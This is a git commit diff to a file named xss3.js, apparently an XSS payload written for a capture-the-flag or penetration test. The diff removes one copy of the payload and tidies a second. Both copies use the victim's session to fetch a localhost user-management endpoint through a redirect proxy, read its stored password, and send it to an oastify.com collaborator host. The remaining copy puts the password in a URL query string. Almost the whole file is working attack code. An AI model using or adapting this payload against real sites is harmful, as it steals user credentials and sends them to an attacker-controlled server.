d1a42a676b4a9f0d57da2723cb092e20ef95e35d
musana <musana@users.noreply.github.com>
2025-06-26 17:49:26 +0300

    Update xss3.js

--- xss3.js
+++ xss3.js
@@ -1,45 +1,15 @@
- (async () => {
-  try {
-    const response = await fetch("https://10.210.34.88/go/http://127.0.0.1:12345/management/users/1", {
-      credentials: "include" 
-    });
-
-    const json = await response.json();
-    const passwdValue = json.securePasswd;
-    
-    await fetch("https://10.210.34.88/go/https://6elcp88rra3cnmz6qr6owuzbp2vtjm7b.oastify.com/log", {
-      method: "GET",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        data: passwdValue,
-        timestamp: Date.now()
-      })
-    });
-
-  } catch (err) {
-    console.error("Hata:", err);
-  }
-})();
-
 
 (async () => {
   try {
-    // İlk fetch: localhost servisten JSON al
     const response = await fetch("https://10.210.34.88/go/http://127.0.0.1:12345/management/users/1", {
       credentials: "include"
     });
 
     const json = await response.json();
-
-    // securepasswd değerini al
     const passwdValue = json.securePasswd;
-
-    // Saldırganın sunucusuna GET isteğiyle gönder (parola parametrede)
     const exfilUrl = `https://10.210.34.88/go/https://6elcp88rra3cnmz6qr6owuzbp2vtjm7b.oastify.com/?log=${encodeURIComponent(passwdValue)}`;
 
-    // İkinci fetch: veri GET ile sızdırılıyor
+
     await fetch(exfilUrl, {
       method: "GET",
       mode: "no-cors"
